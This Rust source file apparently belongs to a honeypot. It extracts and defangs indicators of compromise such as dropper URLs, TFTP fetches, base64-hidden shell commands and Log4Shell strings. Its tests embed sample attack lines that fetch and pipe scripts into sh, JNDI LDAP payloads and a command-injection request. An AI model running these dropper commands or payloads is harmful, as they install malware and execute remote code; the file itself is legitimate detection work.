//! IOC (Indicator of Compromise) extraction and safe defanging

use serde::{Deserialize, Serialize};
use std::collections::HashSet;

const MAX_IOCS_PER_EVENT: usize = 20;
const MAX_B64_INPUT_LEN: usize = 4096;

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct IocItem {
    pub ioc_type: String,
    pub value: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub context: Option<String>,
}

/// Extract URLs, TFTP targets, and base64-decoded dropper commands/URLs from text.
pub fn extract_iocs(text: &str) -> Vec<IocItem> {
    let mut items = Vec::new();
    let mut seen = HashSet::new();

    extract_urls(text, None, &mut items, &mut seen);
    extract_tftp_commands(text, &mut items, &mut seen);
    extract_base64_payloads(text, &mut items, &mut seen);
    extract_jndi_payloads(text, &mut items, &mut seen);

    items.truncate(MAX_IOCS_PER_EVENT);
    items
}

/// Split a raw HTTP/1.x request into `(first_line, headers_block, body)` if `raw` begins with an HTTP request line.
fn split_raw_http(raw: &str) -> Option<(&str, &str, &str)> {
    const METHODS: &[&str] = &[
        "GET ",
        "POST ",
        "HEAD ",
        "PUT ",
        "DELETE ",
        "OPTIONS ",
        "PATCH ",
        "CONNECT ",
        "TRACE ",
        "PROPFIND ",
    ];

    let first_end = raw.find('\n').unwrap_or(raw.len());
    let first_line = raw[..first_end].trim_end_matches('\r');
    let upper = first_line.to_ascii_uppercase();
    if !METHODS.iter().any(|m| upper.starts_with(m)) || !upper.contains(" HTTP/") {
        return None;
    }

    if let Some(pos) = raw.find("\r\n\r\n") {
        let headers = &raw[..pos];
        let body = &raw[pos + 4..];
        Some((first_line, headers, body))
    } else if let Some(pos) = raw.find("\n\n") {
        let headers = &raw[..pos];
        let body = &raw[pos + 2..];
        Some((first_line, headers, body))
    } else {
        Some((first_line, raw, ""))
    }
}

fn scan_http_parts(
    path: &str,
    headers_for_jndi: &str,
    body: Option<&str>,
    self_host: Option<&str>,
) -> Vec<IocItem> {
    let has_body = body.map(|b| !b.trim().is_empty()).unwrap_or(false);
    if is_internal_dashboard_path(path) && !has_body {
        return Vec::new();
    }

    let mut items = Vec::new();
    let mut seen = HashSet::new();

    // 1. Scan request body (POST/PUT/PATCH payloads)
    if let Some(body) = body {
        if !body.trim().is_empty() {
            extract_urls(body, Some("http-body"), &mut items, &mut seen);
            extract_tftp_commands(body, &mut items, &mut seen);
            extract_base64_payloads(body, &mut items, &mut seen);
        }
    }

    // 2. Scan query string or absolute proxy URI in path
    if let Some((_, query)) = path.split_once('?') {
        if query.contains("://") {
            let normalized = query.replace('+', " ");
            extract_urls(&normalized, Some("http-query"), &mut items, &mut seen);
        } else {
            extract_urls(query, Some("http-query"), &mut items, &mut seen);
        }
    }
    let lower_path = path.to_ascii_lowercase();
    if lower_path.starts_with("http://") || lower_path.starts_with("https://") {
        extract_urls(path, Some("open-proxy"), &mut items, &mut seen);
    }

    // 3. Scan headers + body ONLY for Log4Shell ${jndi:...}
    extract_jndi_payloads(headers_for_jndi, &mut items, &mut seen);
    if let Some(body) = body {
        extract_jndi_payloads(body, &mut items, &mut seen);
    }

    // Exclude URLs pointing to the honeypot's own Host header
    if let Some(own_host) = self_host {
        items.retain(|item| {
            url_host(&item.value)
                .map(|h| h != own_host)
                .unwrap_or(true)
        });
    }

    items.truncate(MAX_IOCS_PER_EVENT);
    items
}

/// Extract IOCs aware of protocol context so standard HTTP headers (Referer, User-Agent, Origin)
/// from browsers or uptime monitors are never recorded as attacker IOCs.
pub fn extract_iocs_for_event(
    service: &str,
    request: &str,
    http_path: Option<&str>,
    decoded_payload: Option<&str>,
) -> Vec<IocItem> {
    // Handle raw HTTP requests captured on generic TCP/proxy ports (where payload holds headers + body)
    if let Some(raw) = decoded_payload {
        if let Some((first_line, headers, body)) = split_raw_http(raw) {
            let path = http_path
                .filter(|p| !p.is_empty())
                .or_else(|| first_line.split_whitespace().nth(1))
                .unwrap_or("");
            let self_host = extract_http_host(headers).or_else(|| extract_http_host(request));
            let body_opt = if body.trim().is_empty() { None } else { Some(body) };
            return scan_http_parts(path, headers, body_opt, self_host.as_deref());
        }
    }

    let svc = service.to_ascii_lowercase();
    if matches!(
        svc.as_str(),
        "http" | "https" | "http-alt" | "http-proxy" | "https-alt" | "docker" | "docker-tls" | "elasticsearch" | "ollama"
    ) {
        let path = http_path.unwrap_or("");
        let self_host = extract_http_host(request);
        scan_http_parts(path, request, decoded_payload, self_host.as_deref())
    } else {
        let mut corpus = request.to_string();
        if let Some(dp) = decoded_payload {
            corpus.push('\n');
            corpus.push_str(dp);
        }
        extract_iocs(&corpus)
    }
}

fn is_internal_dashboard_path(path: &str) -> bool {
    let base = path.split('?').next().unwrap_or(path);
    matches!(base, "/" | "/stats" | "/events" | "/robots.txt")
        || base.starts_with("/api/")
        || base.starts_with("/static/")
}

fn extract_http_host(request: &str) -> Option<String> {
    for line in request.lines() {
        if let Some((k, v)) = line.split_once(':') {
            if k.trim().eq_ignore_ascii_case("host") {
                let host = v
                    .trim()
                    .split(':')
                    .next()
                    .unwrap_or("")
                    .to_ascii_lowercase();
                if !host.is_empty() {
                    return Some(host);
                }
            }
        }
    }
    None
}

fn url_host(url: &str) -> Option<String> {
    let after_scheme = url.split_once("://")?.1;
    let host_port = after_scheme.split(['/', '?', '#']).next()?;
    let host = host_port.split(':').next()?.to_ascii_lowercase();
    if host.is_empty() { None } else { Some(host) }
}

fn extract_jndi_payloads(
    text: &str,
    items: &mut Vec<IocItem>,
    seen: &mut HashSet<(String, String)>,
) {
    let lower = text.to_ascii_lowercase();
    let mut from = 0;
    while from < lower.len() && items.len() < MAX_IOCS_PER_EVENT {
        let Some(rel) = lower[from..].find("${jndi:") else {
            break;
        };
        let abs = from + rel;
        let rest = &text[abs..];
        let end = rest
            .find('}')
            .map(|i| i + 1)
            .unwrap_or_else(|| rest.len().min(200));
        let val = rest[..end].trim().to_string();
        push_ioc(items, seen, "jndi", val, Some("log4shell".to_string()));
        from = abs + end.max(7);
    }
}

/// Defang URLs/IPs/domains for safe UI rendering (e.g. http -> hxxp, . -> [.]).
pub fn defang(value: &str) -> String {
    let s = if let Some(rest) = value.strip_prefix("https://") {
        format!("hxxps://{}", rest)
    } else if let Some(rest) = value.strip_prefix("http://") {
        format!("hxxp://{}", rest)
    } else if let Some(rest) = value.strip_prefix("HTTPS://") {
        format!("hxxps://{}", rest)
    } else if let Some(rest) = value.strip_prefix("HTTP://") {
        format!("hxxp://{}", rest)
    } else {
        value.to_string()
    };

    if let Some(scheme_end) = s.find("://") {
        let (prefix, rest) = s.split_at(scheme_end + 3);
        if let Some(slash_idx) = rest.find('/') {
            let (host, path) = rest.split_at(slash_idx);
            format!("{}{}{}", prefix, host.replace('.', "[.]"), path)
        } else {
            format!("{}{}", prefix, rest.replace('.', "[.]"))
        }
    } else {
        s.replace('.', "[.]")
    }
}

fn push_ioc(
    items: &mut Vec<IocItem>,
    seen: &mut HashSet<(String, String)>,
    ioc_type: &str,
    value: String,
    context: Option<String>,
) {
    if items.len() >= MAX_IOCS_PER_EVENT || value.is_empty() {
        return;
    }
    let key = (ioc_type.to_string(), value.clone());
    if seen.insert(key) {
        items.push(IocItem {
            ioc_type: ioc_type.to_string(),
            value,
            context,
        });
    }
}

fn host_matches_domain(host: &str, domain: &str) -> bool {
    host == domain
        || (host.len() > domain.len()
            && host.ends_with(domain)
            && host.as_bytes()[host.len() - domain.len() - 1] == b'.')
}

fn is_valid_ioc_host(host: &str) -> bool {
    if host.is_empty() || host.starts_with('.') || host.ends_with('.') {
        return false;
    }
    if !host
        .bytes()
        .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-' | b'[' | b']'))
    {
        return false;
    }
    host.contains('.') || (host.starts_with('[') && host.ends_with(']'))
}

fn is_benign_ioc_host(host: &str, full_url: &str) -> bool {
    if matches!(
        host,
        "localhost"
            | "127.0.0.1"
            | "0.0.0.0"
            | "example.com"
            | "www.example.com"
            | "example.org"
            | "www.example.org"
            | "example.net"
            | "www.example.net"
    ) || host.ends_with(".invalid")
        || host.ends_with(".example")
        || host.ends_with(".localhost")
    {
        return true;
    }

    const BENIGN_DOMAINS: &[&str] = &[
        // Protocol XML/SOAP/XMPP/UPnP/DTD namespaces
        "w3.org",
        "xmlsoap.org",
        "dmtf.org",
        "jabber.org",
        "oasis-open.org",
        "upnp.org",
        "purenetworks.com",
        "schemas.microsoft.com",
        // Benign scanner, crawler, and uptime monitor info URLs
        "censys.io",
        "shodan.io",
        "paloaltonetworks.com",
        "internet-measurement.com",
        "infrawat.ch",
        "nmap.org",
        "uptimerobot.com",
        "shadowserver.org",
        "onyphe.io",
        "binaryedge.io",
        "driftnet.io",
        "leakix.net",
        "flowiq-labs.com",
        "duckduckgo.com",
        "bing.com",
        "check-host.net",
    ];

    if BENIGN_DOMAINS.iter().any(|d| host_matches_domain(host, d)) {
        return true;
    }

    if host_matches_domain(host, "apple.com") && full_url.to_ascii_lowercase().contains("/dtds/") {
        return true;
    }

    false
}

fn extract_urls(
    text: &str,
    context: Option<&str>,
    items: &mut Vec<IocItem>,
    seen: &mut HashSet<(String, String)>,
) {
    const SCHEMES: &[&str] = &[
        "http://",
        "https://",
        "ftp://",
        "tftp://",
        "stratum+tcp://",
        "stratum+ssl://",
    ];

    let lower = text.to_ascii_lowercase();
    let mut search_from = 0;

    while search_from < lower.len() && items.len() < MAX_IOCS_PER_EVENT {
        let mut next_hit: Option<(usize, &str)> = None;
        for &scheme in SCHEMES {
            if let Some(rel) = lower[search_from..].find(scheme) {
                let abs = search_from + rel;
                if next_hit.map_or(true, |(best, _)| abs < best) {
                    next_hit = Some((abs, scheme));
                }
            }
        }

        let Some((start, scheme)) = next_hit else {
            break;
        };

        // Ensure original slicing starts on valid char boundary
        let rest = &text[start..];
        let mut end = rest.len();
        for (idx, ch) in rest.char_indices() {
            if ch.is_whitespace()
                || ch.is_control()
                || !ch.is_ascii()
                || matches!(ch, '\'' | '"' | ';' | ')' | ']' | '}' | '>' | '<' | '|' | '&' | '`')
            {
                end = idx;
                break;
            }
        }

        let raw_url = rest[..end].trim_end_matches([',', '.']);
        if raw_url.len() > scheme.len() + 2 {
            let host_part = raw_url[scheme.len()..]
                .split(['/', ':', '?'])
                .next()
                .unwrap_or("")
                .to_ascii_lowercase();
            if is_valid_ioc_host(&host_part) && !is_benign_ioc_host(&host_part, raw_url) {
                let ioc_type = if scheme.starts_with("stratum") {
                    "miner_pool"
                } else {
                    "url"
                };
                push_ioc(
                    items,
                    seen,
                    ioc_type,
                    raw_url.to_string(),
                    context.map(|c| c.to_string()),
                );
            }
        }

        search_from = start + scheme.len().max(end);
    }
}

fn extract_tftp_commands(
    text: &str,
    items: &mut Vec<IocItem>,
    seen: &mut HashSet<(String, String)>,
) {
    for line in text.lines() {
        for segment in line.split([';', '|', '&']) {
            let tokens: Vec<&str> = segment.split_whitespace().collect();
            if tokens.first().map(|t| *t == "tftp").unwrap_or(false) {
                let mut remote_file: Option<&str> = None;
                let mut host: Option<&str> = None;
                let mut i = 1;
                while i < tokens.len() {
                    match tokens[i] {
                        "-g" | "-p" => {
                            i += 1;
                        }
                        "-l" => {
                            if i + 1 < tokens.len() {
                                i += 2;
                            } else {
                                i += 1;
                            }
                        }
                        "-r" => {
                            if i + 1 < tokens.len() {
                                remote_file = Some(tokens[i + 1]);
                                i += 2;
                            } else {
                                i += 1;
                            }
                        }
                        tok if !tok.starts_with('-') => {
                            if host.is_none() {
                                host = Some(tok);
                            }
                            i += 1;
                        }
                        _ => i += 1,
                    }
                }
                if let Some(h) = host {
                    if !h.starts_with('.')
                        && !h.starts_with('$')
                        && !h.contains('$')
                        && (h.contains('.') || h.contains(':'))
                    {
                        let val = match remote_file {
                            Some(f) => format!("tftp://{}/{}", h, f.trim_start_matches('/')),
                            None => format!("tftp://{}", h),
                        };
                        push_ioc(items, seen, "url", val, Some("tftp".to_string()));
                    }
                }
            }
        }
    }
}

fn extract_base64_payloads(
    text: &str,
    items: &mut Vec<IocItem>,
    seen: &mut HashSet<(String, String)>,
) {
    let lower = text.to_ascii_lowercase();
    if !lower.contains("base64") {
        return;
    }

    // Look for candidate base64 tokens >= 16 chars in the text
    for raw_tok in text.split(|c: char| {
        c.is_whitespace() || matches!(c, '\'' | '"' | ';' | '|' | '&' | '(' | ')' | '`')
    }) {
        let tok = raw_tok.trim();
        if tok.len() < 16 || tok.len() > MAX_B64_INPUT_LEN {
            continue;
        }
        if !tok
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || b == b'+' || b == b'/' || b == b'=')
        {
            continue;
        }
        if let Some(decoded_bytes) = decode_base64(tok) {
            if let Ok(decoded) = String::from_utf8(decoded_bytes) {
                let printable = decoded
                    .chars()
                    .all(|c| !c.is_control() || matches!(c, '\n' | '\r' | '\t'));
                if printable && !decoded.trim().is_empty() {
                    extract_urls(&decoded, Some("base64"), items, seen);
                    let d_lower = decoded.to_ascii_lowercase();
                    if d_lower.contains("wget ")
                        || d_lower.contains("curl ")
                        || d_lower.contains("/bin/sh")
                        || d_lower.contains("chmod ")
                    {
                        let snippet: String = decoded.trim().chars().take(240).collect();
                        push_ioc(items, seen, "script", snippet, Some("base64".to_string()));
                    }
                }
            }
        }
    }
}

/// Minimal pure-Rust standard base64 decoder (ignores ASCII whitespace).
pub fn decode_base64(input: &str) -> Option<Vec<u8>> {
    let clean: Vec<u8> = input
        .bytes()
        .filter(|b| !b.is_ascii_whitespace())
        .collect();
    if clean.is_empty() || clean.len() % 4 != 0 {
        return None;
    }

    let mut out = Vec::with_capacity((clean.len() / 4) * 3);
    for chunk in clean.chunks_exact(4) {
        let a = b64_val(chunk[0])?;
        let b = b64_val(chunk[1])?;
        let c = if chunk[2] == b'=' { None } else { Some(b64_val(chunk[2])?) };
        let d = if chunk[3] == b'=' { None } else { Some(b64_val(chunk[3])?) };

        out.push((a << 2) | (b >> 4));
        if let Some(c_val) = c {
            out.push((b << 4) | (c_val >> 2));
            if let Some(d_val) = d {
                out.push((c_val << 6) | d_val);
            }
        } else if chunk[3] != b'=' {
            return None;
        }
    }
    Some(out)
}

fn b64_val(b: u8) -> Option<u8> {
    match b {
        b'A'..=b'Z' => Some(b - b'A'),
        b'a'..=b'z' => Some(b - b'a' + 26),
        b'0'..=b'9' => Some(b - b'0' + 52),
        b'+' => Some(62),
        b'/' => Some(63),
        _ => None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn extracts_urls_and_tftp_from_dropper_chain() {
        let cmd = "cd /tmp && wget http://45.155.205.1/bins/mirai.x86; curl -O https://evil.example.com/setup.sh | sh; tftp -g -r arm7 198.51.100.9";
        let iocs = extract_iocs(cmd);
        let values: Vec<&str> = iocs.iter().map(|i| i.value.as_str()).collect();
        assert!(values.contains(&"http://45.155.205.1/bins/mirai.x86"));
        assert!(values.contains(&"https://evil.example.com/setup.sh"));
        assert!(values.contains(&"tftp://198.51.100.9/arm7"));
    }

    #[test]
    fn extracts_and_decodes_base64_droppers() {
        // "wget http://91.92.1.2/p.sh -O-|sh"
        let cmd = "echo d2dldCBodHRwOi8vOTEuOTIuMS4yL3Auc2ggLU8tfHNo | base64 -d | sh";
        let iocs = extract_iocs(cmd);
        assert!(iocs.iter().any(|i| i.ioc_type == "url"
            && i.value == "http://91.92.1.2/p.sh"
            && i.context.as_deref() == Some("base64")));
        assert!(iocs.iter().any(|i| i.ioc_type == "script"));
    }

    #[test]
    fn defangs_urls_safely() {
        assert_eq!(
            defang("http://45.155.205.1/bins/x.sh"),
            "hxxp://45[.]155[.]205[.]1/bins/x.sh"
        );
        assert_eq!(
            defang("https://evil.example.com/a.b"),
            "hxxps://evil[.]example[.]com/a.b"
        );
    }

    #[test]
    fn ignores_http_referer_and_user_agent_urls_but_keeps_body_query_and_jndi() {
        let browser_req = "GET /api/recent HTTP/1.1\nhost: honeypot.example.com\nreferer: https://honeypot.example.com/stats\nuser-agent: Mozilla/5.0";
        assert!(extract_iocs_for_event("http", browser_req, Some("/api/recent"), None).is_empty());

        let uptime_req = "GET / HTTP/1.1\nhost: honeypot.example.com\nreferer: https://monitor.example.com\nuser-agent: Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)";
        assert!(extract_iocs_for_event("http", uptime_req, Some("/"), None).is_empty());

        let unknown_with_ua = "GET /wp-login.php HTTP/1.1\nhost: honeypot.example.com\nuser-agent: CheckHost (https://check-host.net/)";
        assert!(extract_iocs_for_event("http", unknown_with_ua, Some("/wp-login.php"), None).is_empty());

        let attack_req = "POST /wp-login.php HTTP/1.1\nhost: honeypot.example.com\nx-api: ${jndi:ldap://evil.test/a}";
        let iocs = extract_iocs_for_event(
            "http",
            attack_req,
            Some("/wp-login.php?next=http://99.88.77.66/stage"),
            Some("payload=wget+http://45.1.2.3/drop.sh"),
        );
        let values: Vec<&str> = iocs.iter().map(|i| i.value.as_str()).collect();
        assert!(values.contains(&"http://45.1.2.3/drop.sh"));
        assert!(values.contains(&"http://99.88.77.66/stage"));
        assert!(values.contains(&"${jndi:ldap://evil.test/a}"));
    }

    #[test]
    fn strips_raw_http_headers_on_non_80_tcp_ports_and_handles_tftp_l_flag() {
        let raw_probe = "GET / HTTP/1.1\r\nHost: 192.0.2.10:8080\r\nUser-Agent: Infrawatch/1.0 (+https://infrawat.ch/)\r\n\r\n";
        assert!(extract_iocs_for_event("http-proxy", "Connection", None, Some(raw_probe)).is_empty());

        let raw_exploit = "GET /board.cgi?cmd=wget+http://198.51.100.50:8088/Mozi.m+-O+- HTTP/1.0\r\nHost: 192.0.2.10:8080\r\nX-Test: ${jndi:ldap://evil.test/z}\r\n\r\n";
        let iocs = extract_iocs_for_event("http-proxy", "Connection", None, Some(raw_exploit));
        let values: Vec<&str> = iocs.iter().map(|i| i.value.as_str()).collect();
        assert_eq!(values.len(), 2);
        assert!(values.contains(&"http://198.51.100.50:8088/Mozi.m"));
        assert!(values.contains(&"${jndi:ldap://evil.test/z}"));

        // XML/SOAP namespaces & NUL-terminated URLs are ignored / cleanly bounded
        let xml_probe = "POST http://192.0.2.10:49152/upnp HTTP/1.1\r\nHost: 192.0.2.10:49152\r\n\r\n<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"/>";
        assert!(extract_iocs_for_event("unknown", "Connection", None, Some(xml_probe)).is_empty());

        let nul_url = "wget http://198.51.100.2/a.sh\x00\x01garbage";
        let nul_iocs = extract_iocs(nul_url);
        assert_eq!(nul_iocs[0].value, "http://198.51.100.2/a.sh");

        // TFTP -l <localfile> skips the local filename argument
        let tftp_cmd = "tftp -g -l .x -r arm7 198.51.100.9";
        let tftp_iocs = extract_iocs(tftp_cmd);
        assert_eq!(tftp_iocs.len(), 1);
        assert_eq!(tftp_iocs[0].value, "tftp://198.51.100.9/arm7");
    }
}
